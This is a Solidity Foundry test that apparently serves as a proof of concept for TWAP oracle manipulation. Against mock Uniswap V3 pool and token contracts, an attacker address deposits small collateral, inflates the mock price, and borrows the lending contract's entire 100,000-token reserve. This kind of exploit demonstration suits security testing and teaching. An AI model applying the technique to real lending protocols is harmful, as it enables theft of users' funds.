// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/UniV3OracleLending.sol";

contract MockUniswapV3Pool {
    int56 private mockTickCumulative;

    function setTickCumulative(int56 _tickCumulative) external {
        mockTickCumulative = _tickCumulative;
    }

    function observe(uint32[] calldata)
        external
        view
        returns (int56[] memory tickCumulatives, uint160[] memory secondsPerLiquidityCumulativeX128s)
    {
        tickCumulatives = new int56[](2);
        tickCumulatives[0] = 0;
        tickCumulatives[1] = mockTickCumulative;

        secondsPerLiquidityCumulativeX128s = new uint160[](2);
    }
}

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract UniV30racleManipulationTest is Test {
    UniV3OracleLending public lendingPlatform;
    MockUniswapV3Pool public mockPool;
    MockToken public collateralToken;
    MockToken public borrowToken;

    address public attacker = address(0xBAD);

    function setUp() public {
        collateralToken = new MockToken();
        borrowToken = new MockToken();
        mockPool = new MockUniswapV3Pool();

        lendingPlatform = new UniV3OracleLending(address(collateralToken), address(borrowToken), address(mockPool), 300);
        borrowToken.mint(address(lendingPlatform), 100_000 * 10 ** 18);
        collateralToken.mint(attacker, 1 * 10 ** 18);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        collateralToken.approve(address(lendingPlatform), 1 * 10 ** 18);
        lendingPlatform.depositCollateral(1 * 10 ** 18);
        uint256 priceBefore = lendingPlatform.getTwapPrice();
        console.log("Price BEFORE manipulation:", priceBefore);

        mockPool.setTickCumulative(30_000_000);
        vm.warp(block.timestamp + 1);

        uint256 priceAfter = lendingPlatform.getTwapPrice();
        console.log("Price AFTER manipulation:", priceAfter);

        lendingPlatform.borrow();
        vm.stopPrank();

        uint256 attackerBalance = borrowToken.balanceOf(attacker);
        console.log("Attacker borrow token balance:", attackerBalance / 10 ** 18);

        assertEq(attackerBalance, 100_000 * 10 ** 18);
        console.log("--- EXPLOIT SUCCESSFUL STATUS ---");
    }
}
